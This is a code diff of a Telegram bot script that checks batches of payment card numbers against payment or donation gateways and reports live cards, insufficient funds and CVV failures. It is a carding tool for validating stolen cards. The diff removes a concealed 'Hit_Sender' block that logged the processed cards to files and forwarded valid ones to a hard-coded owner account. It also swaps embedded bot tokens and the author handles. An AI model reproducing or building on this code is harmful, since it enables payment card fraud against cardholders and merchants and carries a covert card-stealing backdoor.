@@ -1,10 +1,9 @@
-#main.py
 import requests
 import telebot,time
 from telebot import types
 from gatet import Tele
 import os
-token = '8426509814:AAGAKT9KAy3aWzK-C6jkxEcbKWdBgqu5Cm8'
+token = '7968123321:AAF4H9E77Q0lIwg5QFDxVOwTCwYUG86lT50'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -79,7 +78,7 @@ def main(message):
 				end_time = time.time()
 				execution_time = end_time - start_time
 				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait For Processing   
-by ➜ @strawhatchannel96 ''', reply_markup=mes)
+by ➜ @iwillgoforwardsalone ''', reply_markup=mes)
 				msg = f''' 
 𝐂𝐀𝐑𝐃: <code>{cc}</code>
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Hit $1.00 🔥</code>
@@ -89,39 +88,10 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
 
 𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
-𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
-
-#Hit_Sender
-				# Main Owner ID
-				owner_id = 1318826936  #
-
-				# Card ရလာဒ်ကို Case-insensitive ဖြင့် စစ်ဆေးမယ်
-				card_info = f"💳 Card: {cc.strip()}"
-
-				if "succeeded" in last:
-				    # "thank" "Thank" "THANK" ပါရင် thank_cards.txt ထဲ သိမ်း
-				    with open("thank_cards.txt", "a") as thank_file:
-				        thank_file.write(card_info + "\n")
-
- 				   # "thank" ပါတဲ့ ကဒ်တွေကို Main Owner ဆီသို့ ပို့
-				    bot.send_message(owner_id, f"✅ Thank Result Found:\n{card_info}")
-
-				elif "insufficient funds" in last.lower():
-				    # "insufficient funds" ပါရင် insufficient_cards.txt ထဲ သိမ်း
-				    with open("insufficient_cards.txt", "a") as insufficient_file:
- 				       insufficient_file.write(card_info + "\n")
-
-				    # "insufficient funds" ပါတဲ့ ကဒ်တွေကို Main Owner ဆီသို့ ပို့
-				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n{card_info}")
-
-				else:
-				    # အခြား result များကို other_cards.txt ထဲ သိမ်း
-				    with open("other_cards.txt", "a") as other_file:
- 				       other_file.write(card_info + "\n")
-#Hit_Sender
+𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
 				
 				print(last)
-				if 'Payment processed successfully' in last:
+				if 'Donation Successful!' in last:
 					ch += 1
 					bot.reply_to(message, msg)
 					
@@ -131,7 +101,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				elif 'security code is incorrect' in last or 'security code is invalid' in last:
 					ccn += 1
 					
-				elif 'Not sufficient funds' in last:
+				elif 'insufficient funds' in last:
 					msg = f'''			
 𝐂𝐀𝐑𝐃: <code>{cc}</code>
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Insufficient funds 🔥</code>
@@ -161,7 +131,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				    	
 				else:
 					dd += 1
-					time.sleep(3)
+					time.sleep(5)
 	except Exception as e:
 		print(e)
 	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='CHECKED ✅\nBOT BY ➜ @strawhatchannel96')
